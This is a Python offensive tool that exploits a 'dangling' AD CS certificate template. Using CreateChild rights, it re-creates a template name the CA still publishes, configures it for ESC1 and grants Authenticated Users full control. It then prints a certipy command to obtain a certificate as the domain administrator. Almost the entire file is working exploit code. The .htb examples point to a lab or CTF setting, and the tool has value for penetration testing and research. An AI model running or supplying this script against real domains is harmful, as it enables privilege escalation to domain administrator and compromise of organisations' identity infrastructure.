#!/usr/bin/env python3
"""
dangling-template-esc
=====================
Weaponize a DANGLING AD CS certificate template.

When a low-privileged principal has `CreateChild` on the
`CN=Certificate Templates` container (but NOT WriteProperty/WriteDacl on
existing templates, and no rights on the CA to publish new ones), a template
NAME that the CA still advertises but whose OBJECT was deleted ("dangling")
can be re-created from scratch. Because the CA already publishes the name, the
new object is instantly issuable. We create it preconfigured for ESC1
(ENROLLEE_SUPPLIES_SUBJECT + Client Authentication EKU) with a hand-built
security descriptor granting Authenticated Users full control (enrollment).

Then request a cert as any user (e.g. Administrator) with `certipy req`.

⚠️  For authorized testing and education only. Use only on systems you own
    or are explicitly permitted to test.

Author: CyberAlp0  (https://www.cyberskii.com)
"""

import argparse
import ssl
import sys

try:
    from ldap3 import Server, Connection, Tls, ALL, ALL_ATTRIBUTES, NTLM
except ImportError:
    sys.exit("[-] Missing dependency: pip install ldap3")

try:
    from impacket.ldap import ldaptypes
except ImportError:
    sys.exit("[-] Missing dependency: pip install impacket")


# Full Control access mask (includes the Enroll extended right)
FULL_CONTROL = 0x000F01FF
# Authenticated Users well-known SID
AUTHENTICATED_USERS = "S-1-5-11"
# Client Authentication EKU OID
CLIENT_AUTH_EKU = "1.3.6.1.5.5.7.3.2"


def build_dn(base_container, domain):
    """Build the Certificate Templates container DN from the domain."""
    if base_container:
        return base_container
    dc = ",".join(f"DC={p}" for p in domain.split("."))
    return (f"CN=Certificate Templates,CN=Public Key Services,"
            f"CN=Services,CN=Configuration,{dc}")


def domain_dn(domain):
    return ",".join(f"DC={p}" for p in domain.split("."))


def allow_ace(sid, mask):
    """Build a single ACCESS_ALLOWED_ACE for a SID with the given mask."""
    ace = ldaptypes.ACE()
    ace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
    ace["AceFlags"] = 0x00
    body = ldaptypes.ACCESS_ALLOWED_ACE()
    body["Mask"] = ldaptypes.ACCESS_MASK()
    body["Mask"]["Mask"] = mask
    body["Sid"] = ldaptypes.LDAP_SID()
    body["Sid"].fromCanonical(sid)
    ace["Ace"] = body
    return ace


def build_security_descriptor(owner_sid, grant_sid, mask):
    """Build a self-relative SD: owner = us, DACL = one allow ACE."""
    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
    sd["Revision"] = b"\x01"
    sd["Sbz1"] = b"\x00"
    sd["Control"] = 0x8004  # SE_SELF_RELATIVE | SE_DACL_PRESENT
    sd["OwnerSid"] = ldaptypes.LDAP_SID()
    sd["OwnerSid"].fromCanonical(owner_sid)
    sd["GroupSid"] = b""
    sd["Sacl"] = b""

    acl = ldaptypes.ACL()
    acl["AclRevision"] = 4
    acl["Sbz1"] = 0
    acl["Sbz2"] = 0
    ace = allow_ace(grant_sid, mask)
    # impacket API differs across versions
    try:
        acl.aces = [ace]
    except Exception:
        acl["Data"] = [ace]
    sd["Dacl"] = acl
    return sd.getData()


def main():
    p = argparse.ArgumentParser(
        description="Create a dangling AD CS certificate template preconfigured "
                    "for ESC1 (abuses CreateChild on the templates container).",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    auth = p.add_argument_group("authentication")
    auth.add_argument("-u", "--user", required=True,
                      help="sAMAccountName of the controlled principal (e.g. jake.h)")
    auth.add_argument("-p", "--password", required=True, help="Password")
    auth.add_argument("-d", "--domain", required=True,
                      help="FQDN domain (e.g. danglingtree.htb)")
    auth.add_argument("--dc-host", required=True,
                      help="DC hostname/FQDN for LDAPS (e.g. dc.danglingtree.htb)")

    tgt = p.add_argument_group("template")
    tgt.add_argument("-n", "--new-template", required=True,
                     help="Dangling template NAME to (re)create (e.g. RemoteAccessVPN)")
    tgt.add_argument("-s", "--source-template", default="User",
                     help="Existing template to clone structural attributes from")
    tgt.add_argument("--base-dn", default=None,
                     help="Override the Certificate Templates container DN")
    tgt.add_argument("--grant-sid", default=AUTHENTICATED_USERS,
                     help="SID to grant enrollment (default: Authenticated Users)")

    args = p.parse_args()

    base = build_dn(args.base_dn, args.domain)
    ddn = domain_dn(args.domain)

    # --- connect over LDAPS ---
    print(f"[*] Connecting to {args.dc_host} over LDAPS as {args.domain}\\{args.user}")
    tls = Tls(validate=ssl.CERT_NONE)
    server = Server(args.dc_host, use_ssl=True, tls=tls, get_info=ALL)
    try:
        conn = Connection(
            server,
            user=f"{args.domain}\\{args.user}",
            password=args.password,
            authentication=NTLM,
            auto_bind=True,
        )
    except Exception as ex:
        sys.exit(f"[-] Bind failed: {ex}")
    print("[+] Bound successfully")

    # --- resolve our own SID (we become the object owner) ---
    conn.search(ddn, f"(sAMAccountName={args.user})", attributes=["objectSid"])
    if not conn.entries:
        sys.exit(f"[-] Could not resolve SID for {args.user}")
    owner_sid = conn.entries[0]["objectSid"].value
    print(f"[+] Owner SID: {owner_sid}")

    # --- build the ESC1 security descriptor ---
    sd_bytes = build_security_descriptor(owner_sid, args.grant_sid, FULL_CONTROL)
    print(f"[+] Built security descriptor granting Full Control to {args.grant_sid}")

    # --- clone the source template's structural attributes ---
    conn.search(f"CN={args.source_template},{base}",
                "(objectClass=pKICertificateTemplate)",
                attributes=ALL_ATTRIBUTES)
    if not conn.entries:
        sys.exit(f"[-] Source template '{args.source_template}' not found")
    src = conn.entries[0]

    # attributes we must NOT copy (identity / operational / replaced)
    skip = {
        "distinguishedname", "cn", "name", "objectguid", "objectcategory",
        "objectclass", "whencreated", "whenchanged", "usncreated", "usnchanged",
        "dscorepropagationdata", "instancetype", "displayname",
        "mspki-cert-template-oid", "ntsecuritydescriptor",
    }
    attrs = {a: list(src[a].raw_values)
             for a in src.entry_attributes if a.lower() not in skip}

    # --- override attributes to make it ESC1-vulnerable ---
    attrs["displayName"] = [args.new_template]
    attrs["msPKI-Certificate-Name-Flag"] = ["1"]        # ENROLLEE_SUPPLIES_SUBJECT
    attrs["msPKI-Enrollment-Flag"] = ["0"]              # no manager approval
    attrs["pKIExtendedKeyUsage"] = [CLIENT_AUTH_EKU]    # Client Authentication
    attrs["msPKI-Certificate-Application-Policy"] = [CLIENT_AUTH_EKU]
    attrs["nTSecurityDescriptor"] = [sd_bytes]

    # --- create the object ---
    new_dn = f"CN={args.new_template},{base}"
    print(f"[*] Creating template object: {new_dn}")
    ok = conn.add(new_dn, ["top", "pKICertificateTemplate"], attrs)
    if ok:
        print(f"[+] SUCCESS — '{args.new_template}' created and ready for ESC1")
        print("[*] Next:")
        print(f"    certipy req -u '{args.user}@{args.domain}' -p '<pass>' \\")
        print(f"      -ca '<CA_NAME>' -template '{args.new_template}' \\")
        print(f"      -dc-ip <DC_IP> -target-ip <DC_IP> \\")
        print(f"      -upn 'administrator@{args.domain}' -sid '<ADMIN_SID>'")
    else:
        print(f"[-] FAILED: {conn.result}")
        sys.exit(1)


if __name__ == "__main__":
    main()
